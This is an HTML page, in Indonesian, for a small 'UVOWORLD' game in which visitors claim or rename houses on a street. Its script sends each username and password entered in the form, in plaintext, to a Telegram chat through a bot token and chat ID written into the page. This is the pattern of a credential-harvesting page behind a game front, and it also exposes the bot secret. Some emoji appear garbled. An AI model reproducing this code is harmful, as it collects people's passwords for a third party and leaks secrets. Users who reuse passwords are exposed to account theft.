<!DOCTYPE html>
<html>
<head>
  <title>UVOWORLD - Rumah Interaktif</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      background: #f9f9f9;
    }
    h1 {
      margin-top: 30px;
    }
    .jalan {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 12px;
      margin-top: 40px;
    }
    .rumah {
      width: 100px;
      height: 100px;
      background: #cce;
      border: 2px solid #444;
      border-radius: 8px;
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      cursor: pointer;
      box-shadow: 2px 2px 5px rgba(0,0,0,0.2);
    }
    .klaim { background-color: #cce; }
    .sudah { background-color: #aaffaa; }
    #formBox {
      display: none;
      margin-top: 20px;
    }
    input {
      padding: 6px;
      margin: 5px;
      border-radius: 4px;
      border: 1px solid #aaa;
      width: 200px;
    }
    button {
      padding: 8px 16px;
      background: #3399ff;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 5px;
      cursor: pointer;
    }
    button:hover {
      background: #2277cc;
    }
  </style>
</head>
<body>

<h1>üè° UVOWORLD</h1>
<p>Klik salah satu rumah di jalan untuk klaim atau edit</p>

<div class="jalan" id="jalan"></div>

<div id="formBox">
  <h3 id="judulForm">Klaim Rumah</h3>
  <input id="username" placeholder="Username">
  <input id="password" type="password" placeholder="Password">
  <input id="newName" placeholder="Nama Rumah Baru (opsional)">
  <button onclick="kirim()">Kirim</button>
</div>

<script>
  const botToken = "7961343490:AAGKb3JPPVBj1egmQU0hq2VfZTFmlx1zpi8";
  const chatId = "6501126879";

  const rumahStatus = Array(10).fill(null); // null = belum diklaim
  let rumahAktif = -1;

  function renderRumah() {
    const jalan = document.getElementById("jalan");
    jalan.innerHTML = "";
    rumahStatus.forEach((rumah, i) => {
      const div = document.createElement("div");
      div.className = "rumah " + (rumah ? "sudah" : "klaim");
      div.innerText = rumah ? rumah.nama : `Rumah ${i+1}`;
      div.onclick = () => bukaForm(i);
      jalan.appendChild(div);
    });
  }

  function bukaForm(index) {
    rumahAktif = index;
    document.getElementById("formBox").style.display = "block";
    document.getElementById("judulForm").innerText = rumahStatus[index] ?
      `Edit Rumah ${index+1}` : `Klaim Rumah ${index+1}`;
  }

  function kirim() {
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();
    const nama = document.getElementById("newName").value.trim();

    if (!user || !pass) return alert("Isi username & password!");

    let text = rumahStatus[rumahAktif] ?
      `‚úèÔ∏è Edit Rumah ${rumahAktif+1}\nüë§ Username: ${user}\nüîí Password: ${pass}\nüè† Nama Baru: ${nama || '(tidak diubah)'}` :
      `‚úÖ Klaim Rumah ${rumahAktif+1}\nüë§ Username: ${user}\nüîí Password: ${pass}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: text })
    })
    .then(res => res.json())
    .then(() => {
      alert("‚úÖ Berhasil dikirim ke bot!");
      if (!rumahStatus[rumahAktif]) {
        rumahStatus[rumahAktif] = { user, pass, nama: nama || `Rumah ${rumahAktif+1}` };
      } else {
        if (rumahStatus[rumahAktif].user === user && rumahStatus[rumahAktif].pass === pass) {
          rumahStatus[rumahAktif].nama = nama || rumahStatus[rumahAktif].nama;
        } else {
          alert("‚ùå Login gagal. Username/password salah.");
          return;
        }
      }
      document.getElementById("formBox").style.display = "none";
      renderRumah();
    })
    .catch(() => alert("‚ùå Gagal kirim ke bot."));
  }

  renderRumah();
</script>

</body>
</html>
